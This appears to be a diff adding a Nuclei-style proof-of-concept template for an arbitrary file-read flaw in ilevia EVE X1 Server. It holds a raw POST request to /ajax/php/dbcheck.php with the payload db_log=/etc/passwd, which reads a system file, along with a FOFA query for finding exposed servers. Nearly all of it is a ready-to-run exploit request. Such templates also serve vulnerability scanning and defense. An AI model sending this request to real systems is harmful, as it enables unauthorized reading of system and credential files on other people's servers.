@@ -1,0 +1,34 @@
+id: poc-ncdmpnrit9uqgczk
+info:
+  name: IleviaEVEX1Server-dbcheck-存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ncdmpnrit9uqgczk'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ncdmpnrit9uqgczk
+    fofa: app="ilevia-EVE-X1-Server"
+http:
+- raw:
+  - 'POST /ajax/php/dbcheck.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1
+
+    Connection: close
+
+    Content-Length: 18
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip
+
+
+    db_log=/etc/passwd'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
